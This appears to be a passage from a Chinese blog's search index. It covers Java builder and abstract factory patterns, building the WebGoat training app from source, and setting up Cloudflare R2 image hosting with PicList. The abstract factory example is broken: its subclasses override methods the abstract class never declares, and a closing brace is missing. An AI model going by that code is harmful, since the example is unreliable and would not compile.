<h2 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-type">int</span> age;<br>    String name;<br>    String gender; <br>    String profession;<br>    List&lt;String&gt; awards;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender = gender; <br>        <span class="hljs-built_in">this</span>.profession = profession;<br>        <span class="hljs-built_in">this</span>.awards = awards;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StudentBuilder <span class="hljs-title function_">builder</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//通过builder直接获取建造者</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StudentBuilder</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentBuilder</span> &#123;<br>        <span class="hljs-type">int</span> id;<br>        <span class="hljs-type">int</span> age;<br>        String name;<br>        String gender;<br>        String profession;<br>        List&lt;String&gt; awards;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">id</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>            <span class="hljs-built_in">this</span>.id = id;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">age</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>            <span class="hljs-built_in">this</span>.age = age;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">name</span><span class="hljs-params">(String name)</span> &#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">gender</span><span class="hljs-params">(String gender)</span> &#123;<br>            <span class="hljs-built_in">this</span>.gender = gender;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">profession</span><span class="hljs-params">(String profession)</span> &#123;<br>            <span class="hljs-built_in">this</span>.profession = profession;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">awards</span><span class="hljs-params">(List&lt;String&gt; awards)</span> &#123;<br>            <span class="hljs-built_in">this</span>.awards = awards;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Student <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(id, age, name, gender, profession, awards);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Student.<span class="hljs-type">StudentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> Student.builder();<br>        List&lt;String&gt; awards = Arrays.asList(<span class="hljs-string">&quot;LPL 春季赛冠军&quot;</span>, <span class="hljs-string">&quot;上海Major冠军&quot;</span>);<br>        builder.id(<span class="hljs-number">1</span>).name(<span class="hljs-string">&quot;John Doe&quot;</span>).gender(<span class="hljs-string">&quot;Male&quot;</span>).awards(awards).profession(<span class="hljs-string">&quot;&quot;</span>).build();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><strong>建造者模式提供了一种清晰、灵活且易于维护的方式来构建对象，尤其适用于具有多个参数和复杂构建逻辑的情况。</strong></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>创建型-抽象工厂模式</title>
    <url>/2024/05/07/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​	工厂模式关注于创建单个对象，通过一个工厂类来实现。但是假如遇到需要创建一系列相关或相互依赖的对象的时候，就有些乏力了，而抽象工厂模式能很好的解决这个问题。</p>
<h2 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//水果抽象类</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String name;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">Fruit</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name +<span class="hljs-string">&quot;@&quot;</span>+hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Apple</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//水果实现类</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;苹果&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Orange</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fruit</span> &#123; <span class="hljs-comment">//水果实现类</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Orange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;橘子&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;  <span class="hljs-comment">//抽象水果工厂</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Fruit <span class="hljs-title function_">getApple</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Fruit <span class="hljs-title function_">getOrange</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppleFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createApple</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Apple</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createOrange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 在苹果工厂中不创建橘子</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrangeFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractFruitFactory</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createApple</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 在橘子工厂中不创建苹果</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Fruit <span class="hljs-title function_">createOrange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Orange</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AbstractFruitFactory</span> <span class="hljs-variable">appleFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppleFactory</span>();<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">apple</span> <span class="hljs-operator">=</span> appleFactory.createApple();<br>        System.out.println(apple);<br><br>        <span class="hljs-type">AbstractFruitFactory</span> <span class="hljs-variable">orangeFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrangeFactory</span>();<br>        <span class="hljs-type">Fruit</span> <span class="hljs-variable">orange</span> <span class="hljs-operator">=</span> orangeFactory.createOrange();<br>        System.out.println(orange);<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="工厂模式和抽象工厂模式的区别"><a href="#工厂模式和抽象工厂模式的区别" class="headerlink" title="工厂模式和抽象工厂模式的区别"></a>工厂模式和抽象工厂模式的区别</h2><p>​	<strong>工厂模式关注于创建单个对象，通常是通过一个工厂类来实现。</strong></p>
<p>​	<strong>工厂模式适用于创建单个对象的场景，抽象工厂模式适用于需要创建一系列相关对象的场景。</strong></p>
<p>​	<strong>抽象工厂模式则更加封闭，因为它需要一次性定义所有产品族的创建方法。</strong></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>源码部署WebGoat</title>
    <url>/2024/05/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BA%90%E7%A0%81%E9%83%A8%E7%BD%B2Webgoat/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>WebGoat项目地址: <a href="https://github.com/WebGoat/WebGoat">WebGoat</a></p>
<p>需要JAVA17或者JAVA21，因为Spring boot3最低要求是JAVA17.</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529143754756.png" alt="image-20240529143754756"></p>
<h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/WebGoat/WebGoat.git<br></code></pre></td></tr></table></figure>

<h3 id="使用IDEA构建项目"><a href="#使用IDEA构建项目" class="headerlink" title="使用IDEA构建项目"></a>使用IDEA构建项目</h3><p>IDEA自带maven所以我们不需要单独下载</p>
<p>找到<code>~/WebGoat/pom.xml</code>用idea打开，选择<code>open as peoject</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529162034060.png" alt="image-20240529162034060"></p>
<p>IDEA会自动下载maven的依赖，时间比较长。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163502058.png" alt="image-20240529163502058"></p>
<p>等插件下载完成，找到目录：<code>src.main.java.org.owasp#webgoat.server.StartWebGoat</code>点击运行，访问 <a href="http://127.0.0.1:8080/WebGoat/">http://127.0.0.1:8080/WebGoat/</a> 和 <a href="http://127.0.0.1:9090/WebWolf/">http://127.0.0.1:9090/WebWolf/</a> 即可</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163537696.png" alt="image-20240529163537696"></p>
<h2 id="遇到报错"><a href="#遇到报错" class="headerlink" title="遇到报错"></a>遇到报错</h2><p>大概原因是<code>javax.management.InstanceAlreadyExistsException</code> 导致启动失败。因为 JMX（Java Management Extensions）中的 MBean（Managed Bean）已经存在于 MBean 服务器中，导致无法重复注册。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173118068.png" alt="image-20240529173118068"></p>
<p>选择禁用JMX端点即可</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173328755.png" alt="image-20240529173328755"></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>利用cloudflare R2搭建图床</title>
    <url>/2024/06/28/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E5%88%A9%E7%94%A8cloudflare%20R2%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前博客都是通过GitHub实现图床的，但是国内访问图片的速度实在是不敢恭维；另外GitHub其实是不允许做图床的，当库超过1G以后会有人工审查，发现是图床可能会删库，甚至封帐号；</p>
<h2 id="前期解决方案"><a href="#前期解决方案" class="headerlink" title="前期解决方案"></a>前期解决方案</h2><p>总体来看有几个解决方法</p>
<p>阿里云oss	腾讯云cos	七牛云	又拍云</p>
<p>七牛云有免费的额度，也可以使用不备案的域名，但是这样的话图片速度比Github还慢</p>
<p>又拍云需要网站备案，加入又拍云联盟才有免费额度，又拍云联盟需要在你的网站上加上他们的广告和需要手持证件照拍照审核</p>
<p>综上，前期我用的第一个解决方案是腾讯云的cos桶，类似的还有阿里云的oss，价格其实也不贵</p>
<p>但是当我部署完了，去浏览器打开图片连接发现，浏览器会自动下载图片，不能预览，翻了半天cos介绍才知道，域名没备案的不支持预览，浏览器打开连接就直接下载了。用了一段时间，虽然没啥大问题，但是总感觉不爽。</p>
<p>总体来说上面的方案都需要备案才能有良好的使用体验。</p>
<p>于是最后转向了<strong>Cloudflare</strong>的怀抱</p>
<p>优势是：</p>
<p>网站不需要备案，有免费额度</p>
<p>图片响应速度快</p>
<p><strong>R2 定价</strong></p>
<table>
<thead>
<tr>
<th>ㅤ</th>
<th>免费</th>
<th>超出部分&#x2F;月费</th>
</tr>
</thead>
<tbody><tr>
<td>存储</td>
<td>10 GB&#x2F;月</td>
<td>0.015 美元&#x2F;GB</td>
</tr>
<tr>
<td>A 类操作</td>
<td>100 万次&#x2F;月</td>
<td>4.50 美元&#x2F;百万次</td>
</tr>
<tr>
<td>B 类操作</td>
<td>1000 万次&#x2F;月</td>
<td>0.36 美元&#x2F;百万次</td>
</tr>
</tbody></table>
<h2 id="使用Cloudflare-R2的前期准备"><a href="#使用Cloudflare-R2的前期准备" class="headerlink" title="使用Cloudflare R2的前期准备"></a>使用Cloudflare R2的前期准备</h2><p><a href="https://github.com/Kuingsmile/PicList">PicList</a></p>
<p><a href="https://www.paypal.com/">paypal</a></p>
<p>域名(可不备案)</p>
<hr>
<p>首先需要把你的域名添加到<strong>Cloudflare</strong></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145013147.png" alt="image-20240628145013147"></p>
<p>选择免费的计划就行，随后会分配两个dns服务器</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145259856.png" alt="image-20240628145259856"></p>
<p>直接去域名的服务商那里改成这<strong>Cloudflare</strong>的DNS地址</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145524103.png" alt="image-20240628145524103"></p>
<p>另外使用CF之后发现，网站加载速度很慢。把A记录和CNAME设置为仅DNS就行</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151002609.png" alt="image-20240628151002609"></p>
<h2 id="第一个坑点"><a href="#第一个坑点" class="headerlink" title="第一个坑点"></a>第一个坑点</h2><p>其实之前很早就了解<strong>Cloudflare</strong>了，上去看了一下，有很多自己不是很了解的东西，就留在温柔乡了。。。继续使用cos桶；另一个问题是之前听过创建R2存储用paypal就行，但是我上去看必须要信用卡，遂放弃。</p>
<p>偶然发现是梯子的问题</p>
<p>个人习惯梯子开机自启，习惯谷歌，杜绝百度</p>
<p>可以看到并没有出现paypal的选项</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144516183.png" alt="image-20240628144516183"></p>
<p>不开梯子就可以使用paypal付款了</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144701802.png" alt="image-20240628144701802"></p>
<h2 id="创建存储桶"><a href="#创建存储桶" class="headerlink" title="创建存储桶"></a>创建存储桶</h2><p>位置选择 亚太地区</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151346032.png" alt="image-20240628151346032"></p>
<p>R2创建完之后，设置连接域名，输入刚刚添加的域名的三级域名，比如 a.com 写为image.a.com，<strong>Cloudflare</strong>会自动添加记录，用这个域名就可以访问R2存储的内容</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151514382.png" alt="image-20240628151514382"></p>
<p>接着添加一个管理令牌</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151750145.png" alt="image-20240628151750145"></p>
<p>剩下的默认即可</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151925647.png" alt="image-20240628151925647"></p>
<h2 id="PicList不能同步闪出云端图片的解决方案"><a href="#PicList不能同步闪出云端图片的解决方案" class="headerlink" title="PicList不能同步闪出云端图片的解决方案"></a>PicList不能同步闪出云端图片的解决方案</h2><p>严格按照如图所示位置填写</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628152607640.png" alt="image-20240628152607640"></p>
<p>上传路径可以根据表自己组合填写</p>
<table>
<thead>
<tr>
<th align="center">payload</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>&#123;year&#125;</code></td>
<td align="center">当前日期 - 年</td>
</tr>
<tr>
<td align="center"><code>&#123;month&#125;</code></td>
<td align="center">当前日期 - 月</td>
</tr>
<tr>
<td align="center"><code>&#123;day&#125;</code></td>
<td align="center">当前日期 - 日</td>
</tr>
<tr>
<td align="center"><code>&#123;fullName&#125;</code></td>
<td align="center">完整文件名（含扩展名）</td>
</tr>
<tr>
<td align="center"><code>&#123;fileName&#125;</code></td>
<td align="center">文件名（不含扩展名）</td>
</tr>
<tr>
<td align="center"><code>&#123;extName&#125;</code></td>
<td align="center">扩展名（不含.）</td>
</tr>
<tr>
<td align="center"><code>&#123;md5&#125;</code></td>
<td align="center">图片 MD5 计算值</td>
</tr>
<tr>
<td align="center"><code>&#123;sha1&#125;</code></td>
<td align="center">图片 SHA1 计算值</td>
</tr>
<tr>
<td align="center"><code>&#123;sha256&#125;</code></td>
<td align="center">图片 SHA256 计算值</td>
</tr>
<tr>
<td align="center"><code>&#123;timestamp&#125;</code></td>
<td align="center">Unix 时间戳</td>
</tr>
<tr>
<td align="center"><code>&#123;timestampMS&#125;</code></td>
<td align="center">Unix 时间戳（毫秒）</td>
</tr>
</tbody></table>
<p>地区因为选择亚太地区所有填写 apac</p>
<p><strong>自定义域名写刚刚的三级域名如:<a href="http://image.a.com/">http://image.a.com</a></strong></p>
<hr>
<h3 id="踩坑原因"><a href="#踩坑原因" class="headerlink" title="踩坑原因"></a>踩坑原因</h3><p>之前设置<strong>PicList</strong>自定义节点使用了这个 S3 API，它其实和上图管辖地址只差一个存储桶的名字 </p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628153202851.png" alt="image-20240628153202851"></p>
<p>而且可以上传图片，但是图片在typora加载会失败</p>
<p>随后将<strong>PicList</strong>自定义域名<a href="http://image.a.com,改为http//image.a.com/blog1">http://image.a.com，改为http://image.a.com/blog1</a></p>
<p>图片显示正常</p>
<p>用了一段时间才发现<strong>PicList</strong>不能同步删除云端图片，看日志没有看到删除记录</p>
<p>最开始谷歌半天找不到，随后找到这个issuse:<a href="https://github.com/Kuingsmile/PicList/issues/203%E6%89%8D%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98">https://github.com/Kuingsmile/PicList/issues/203才解决这个问题</a></p>
<p>随后<strong>PicList</strong>也可以正常的删除云端的图片了</p>
<p><strong>(浪费贼多时间去谷歌，看来下次遇到问题得先去看issuse)</strong></p>
<h2 id="🤗Enjoy！"><a href="#🤗Enjoy！" class="headerlink" title="🤗Enjoy！"></a>🤗Enjoy！</h2><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://developers.cloudflare.com/r2/">Cloudflare R2 · Cloudflare R2 docs</a></p>
<p><a href="https://github.com/Kuingsmile/PicList/issues/203">Bug无法同步删除云端 #203</a></p>
<p><a href="https://piclist.cn/app">PicList文档</a></p>
]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>奇技淫巧</tag>
      </tags>
  </entry>
</search>
